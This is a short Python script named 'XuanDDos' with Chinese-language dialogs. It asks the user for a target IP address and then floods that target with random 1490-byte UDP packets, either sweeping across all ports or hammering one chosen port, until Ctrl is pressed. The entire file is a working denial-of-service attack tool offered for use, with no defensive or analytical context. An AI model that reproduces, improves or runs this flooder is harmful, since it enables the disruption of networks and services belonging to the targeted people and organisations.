import sys
import os
import time
import socket
import random
import keyboard
import easygui
print("XuanDDos")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = easygui.enterbox("目标IP:")
while True:
    ModeChoose = easygui.choicebox("选择攻击方式","ChooseAttackMode",["全端口攻击","固定端口攻击"])
    if ModeChoose == "全端口攻击":
        AttackMode = "AllPort"
        break
    elif ModeChoose == "固定端口攻击":
        AttackMode = "OnePort"
        OP = int(easygui.enterbox("请输入你要攻击的端口:","选择端口"))
        OPstr = str(OP)
        break
port = 1
sent = 0
easygui.msgbox("点击OK后按下ESC键开始DDos,按下ctrl键停止DDos")
keyboard.wait("esc")
if AttackMode == "AllPort":
    while True:
        sock.sendto(bytes,(ip,port))
        sent = sent + 1
        SentStr = str(sent)
        port = port + 1
        PortStr = str(port-1)
        print("对"+ip+"进行了第"+SentStr+"次攻击,当前攻击端口:"+PortStr)
        if port == 65534:
             port = 1
        if keyboard.is_pressed("ctrl") == True:
            break
elif AttackMode == "OnePort":
    while True:
        sock.sendto(bytes,(ip,OP))
        sent = sent + 1
        SentStr = str(sent)
        print("对"+ip+"进行了第"+SentStr+"次攻击,当前攻击端口:"+OPstr)
        if keyboard.is_pressed("ctrl") == True:
            break
easygui.msgbox("DDos已停止")
